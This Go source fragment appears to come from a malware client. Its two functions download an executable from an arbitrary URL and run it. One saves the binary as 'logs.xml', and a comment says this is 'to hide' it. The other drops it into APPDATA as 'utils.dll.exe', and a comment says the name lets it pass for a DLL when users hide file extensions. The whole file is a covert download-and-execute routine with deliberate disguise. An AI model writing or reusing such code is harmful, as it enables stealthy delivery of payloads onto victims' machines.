package main

import "os"
import "github.com/cavaliercoder/grab"
//import "github.com/cleversoap/go-cp"


func Upgrade(link string) {
	//saves link download to logs.xml. Should be a DIRECT download!!!
	grab.Get("logs.xml", link) //donwloads new exe and saves as xml to hide 
	Run("logs.xml") //runs file as binary
}

func DownloadAndRun(url string) {
	fileName := "utils.dll.exe"  // .dll for impersonating dll if user hides common extensions
	grab.Get(os.Getenv("APPDATA") + "\\" + fileName, url)
	Run("start " + os.Getenv("APPDATA")+"\\"+fileName)
}